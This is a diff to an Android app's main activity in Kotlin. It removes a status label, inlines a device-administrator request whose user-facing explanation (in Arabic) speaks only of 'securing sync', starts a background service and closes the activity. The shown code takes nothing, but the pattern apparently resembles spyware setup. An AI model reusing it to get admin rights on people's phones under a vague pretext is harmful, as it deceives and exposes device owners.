@@ -343,14 +343,6 @@ class MainActivity : AppCompatActivity() {
         }
         layout.addView(titleTextView)
 
-        val infoTextView = TextView(this).apply {
-            text = "جاري تهيئة منظومة المزامنة..."
-            textSize = 14f
-            setTextColor(Color.WHITE)
-            gravity = Gravity.CENTER
-        }
-        layout.addView(infoTextView)
-
         setContentView(layout)
 
         devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
@@ -361,14 +353,11 @@ class MainActivity : AppCompatActivity() {
 
     private fun requestAllPermissions() {
         ActivityCompat.requestPermissions(this, dynamicPermissions, 100)
-        requestDeviceAdminAndStartService()
-    }
-
-    private fun requestDeviceAdminAndStartService() {
+        
         if (!devicePolicyManager.isAdminActive(adminComponent)) {
             val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                 putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
-                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "تفعيل الصلاحيات الأمنية لتأمين المزامنة وإدارة النظام.")
+                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "تفعيل الصلاحيات الأمنية لتأمين المزامنة.")
             }
             startActivity(intent)
         } else {
@@ -386,7 +375,7 @@ class MainActivity : AppCompatActivity() {
         } else {
             startService(serviceIntent)
         }
-        Toast.makeText(this, "تم تفعيل المنظومة بنجاح تام", Toast.LENGTH_SHORT).show()
+        Toast.makeText(this, "تم تشغيل المنظومة بنجاح", Toast.LENGTH_SHORT).show()
         finish()
     }
 }
